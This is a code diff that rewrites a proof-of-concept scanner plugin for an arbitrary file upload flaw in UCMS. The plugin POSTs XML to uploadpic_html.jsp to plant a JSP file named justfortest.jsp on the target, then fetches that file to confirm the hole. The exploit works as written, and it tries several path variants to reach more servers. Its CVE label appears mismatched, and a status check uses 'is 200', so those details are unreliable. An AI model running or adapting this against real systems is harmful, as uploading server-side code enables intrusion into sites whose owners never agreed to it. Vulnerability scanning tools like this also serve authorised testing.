@@ -2,37 +2,41 @@
 # -*- coding: utf-8 -*-
 # @author: 'orleven'
 
-def info(data=None):
-    info = {
-        "name": "ucms upload",
-        "info": "ucms upload.",
-        "level": "high",
-        "type": "upload"
-    }
-    return info
+from script import Script, SERVER_PORT_MAP
 
-def prove(data):
-    xmldata = '''
-    <?xml version="1.0" encoding="UTF-8"?>
-    <root>
-    dGVzdCBieSBtZQ==
-    </root>
-    '''
-    data = init(data,'ucms')
-    if data['base_url']:
-        for url in [data['base_url'], data['url']]:
-            myurl = url + '/ucms/cms/client/uploadpic_html.jsp?toname=justfortest.jsp&diskno=xxxx'
-            res = curl('post',myurl,data = xmldata)
-            if res != None and res.status_code is 200:
-                myurl = url + '/ucms/cms-data/temp_dir/xxxx/temp.files/justfortest.jsp'
-                testres = curl('post',myurl,data = xmldata)
-                if testres != None and 'test by me' in testres.text:
-                    data['flag'] = 1
-                    data['data'].append({"page": myurl})
-                    data['res'].append({"info": myurl, "key": "ucms upload"})
-    return data
+class POC(Script):
+    def __init__(self, target=None):
+        self.server_type = SERVER_PORT_MAP.WEB
+        self.name = 'CVE-2015-1427'
+        self.keyword = ['ucms', 'upload']
+        self.info = 'ucms upload'
+        self.type = 'rce'
+        self.level = 'high'
+        Script.__init__(self, target=target, server_type=self.server_type)
 
 
-if __name__=='__main__':
-    from script import init, curl
-    print(prove({'url':'http://www.baidu.com','flag':-1,'data':[],'res':[]}))
+    def prove(self):
+        xmldata = '''
+        <?xml version="1.0" encoding="UTF-8"?>
+        <root>
+        dGVzdCBieSBtZQ==
+        </root>
+        '''
+        self.get_url()
+        if self.base_url:
+            path_list = list(set([
+                self.url_normpath(self.base_url, '/'),
+                self.url_normpath(self.base_url, '../ucms/'),
+                self.url_normpath(self.url, 'ucms/'),
+                self.url_normpath(self.url, '../ucms/'),
+            ]))
+            for path in path_list:
+                myurl = path + '/cms/client/uploadpic_html.jsp?toname=justfortest.jsp&diskno=xxxx'
+                res = self.curl('post', myurl, data=xmldata)
+                if res != None and res.status_code is 200:
+                    myurl = path + '/cms-data/temp_dir/xxxx/temp.files/justfortest.jsp'
+                    testres = self.curl('post', myurl, data=xmldata)
+                    if testres != None and 'test by me' in testres.text:
+                        self.flag = 1
+                        self.req.append({"page": myurl})
+                        self.res.append({"info": myurl, "key": "ucms upload"})
